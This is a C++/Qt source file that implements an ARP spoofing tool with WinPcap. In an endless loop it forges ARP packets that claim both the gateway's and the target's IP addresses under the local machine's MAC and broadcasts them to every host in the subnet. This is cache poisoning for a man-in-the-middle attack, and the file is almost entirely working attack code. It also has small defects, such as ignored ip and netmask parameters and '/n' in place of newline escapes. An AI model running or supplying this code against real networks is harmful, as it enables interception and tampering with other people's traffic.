#include "arpspoofing.h"
#include <QDebug>

void ARPSpoofing::run(){

    while(used_network_card == ""){
        ;
    }

    init();

    qDebug()<<"6";

    QString target_IP = target;

    while(true){

        qDebug()<<"5";

        target = gatewayIP;

        sendSpoofingPackage();

        sleep(3);

        target = target_IP;

        sendSpoofingPackage();

        sleep(3);

    }

}

unsigned char *ARPSpoofing::GetSelfMac(char *pDevName)
{
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName);
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		return NULL;
	}
	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL)
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	}
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;
	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData);
	if (Status)
	{
		memcpy(mac, (u_char *)(OidData->Data), 6);
	}
	free(OidData);
	PacketCloseAdapter(lpAdapter);
	return mac;
}


unsigned char *ARPSpoofing::BuildArpPacket(unsigned char *source_mac,
        unsigned long srcIP, unsigned long destIP)
{
	static struct arp_packet packet;
	//目的MAC地址为广播地址，FF-FF-FF-FF-FF-FF
	memset(packet.eth.dest_mac, 0xFF, 6);
	//源MAC地址
	memcpy(packet.eth.source_mac, source_mac, 6);
	//上层协议为ARP协议，0x0806
	packet.eth.eh_type = htons(0x0806);
	//硬件类型，Ethernet是0x0001
	packet.arp.hardware_type = htons(0x0001);
	//上层协议类型，IP为0x0800
	packet.arp.protocol_type = htons(0x0800);
	//硬件地址长度：MAC地址长度为0x06
	packet.arp.add_len = 0x06;
	//协议地址长度：IP地址长度为0x04
	packet.arp.pro_len = 0x04;
	//操作：ARP请求为1
	packet.arp.option = htons(0x0001);
	//源MAC地址
	memcpy(packet.arp.sour_addr, source_mac, 6);
	//源IP地址
	packet.arp.sour_ip = srcIP;
	//目的MAC地址，填充0
	memset(packet.arp.dest_addr, 0, 6);
	//目的IP地址
	packet.arp.dest_ip = destIP;
	//填充数据，18B
	memset(packet.arp.padding, 0, 18);
	return (unsigned char *)&packet;
}

void ARPSpoofing::init() {

	pcap_if_t *alldevs;            //全部网卡列表
	int i = 0;                     //循环变量
	char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区

	/* 获得本机网卡列表 */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s/n", errbuf);
		exit(1);
	}

    qDebug()<<"a";

	/* 移动指针到用户选择的网卡 */
    for (d = alldevs, i = 0; strcmp(d->name+8, used_network_card.toStdString().c_str()); d = d->next, i++)
		;

	mac_addr = GetSelfMac(d->name + 8); //+8以去掉"rpcap://"

    qDebug()<<"b";

	if ((adhandle = pcap_open(d->name, // name of the device
	                          65536,   // portion of the packet to capture
	                          0,       //open flag
	                          1000,    // read timeout
	                          NULL,    // authentication on the remote machine
	                          errbuf   // error buffer
	                         )) == NULL)
	{
		fprintf(stderr, "/nUnable to open the adapter. %s is not supported by WinPcap/n",
		        d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);

		return;
	}

    qDebug()<<"c";

}

void ARPSpoofing::sendSpoofingPackage() {

	unsigned long target_IP = inet_addr(target.toStdString().c_str());
	unsigned char *packet;         //ARP包
	pcap_addr_t *pAddr;            //网卡地址
//	unsigned long ip;              //IP地址
//	unsigned long netmask;         //子网掩码

    qDebug()<<d->description;
    qDebug()<<d->name;
    qDebug()<<d->addresses;

//    for (pAddr = d->addresses; pAddr!=NULL; pAddr = pAddr->next)
	{
		//得到用户选择的网卡的一个IP地址
//		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
        qDebug()<<ip;
		//得到该IP地址对应的子网掩码
//		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;
        qDebug()<<netmask;
		// 判断是否获取失败
		if (!ip || !netmask)
		{
//			continue;
            return;
		}
		//看看这个IP和要伪装的IP是否在同一个子网
		if ((ip & netmask) != (target_IP & netmask))
		{
//			continue; //如果不在一个子网，继续遍历地址列表
            return;
		}
		unsigned long netsize = ntohl(~netmask); //网络中主机数
		unsigned long net = ip & netmask;        //子网地址
        printf("发送ARP欺骗包，本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)/n",
               mac_addr[0],mac_addr[1],mac_addr[2],mac_addr[3],mac_addr[4],mac_addr[5]);
		for (unsigned long n = 1; n < netsize; n++)
		{
			//第i台主机的IP地址，网络字节顺序
			unsigned long destIp = net | htonl(n);
			//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的
			packet = BuildArpPacket(mac_addr, target_IP, destIp);
			if (pcap_sendpacket(adhandle, packet, 60) == -1)
			{
				fprintf(stderr, "pcap_sendpacket error./n");
			}
		}
        qDebug()<<"9";
	}

    qDebug()<<"10";

}


void ARPSpoofing::setParameter(QString target, QString gatewayIP, QString dev_name,unsigned long ip,unsigned long netmask){

    this->target = target;
    this->gatewayIP = gatewayIP;
    used_network_card = dev_name;

}

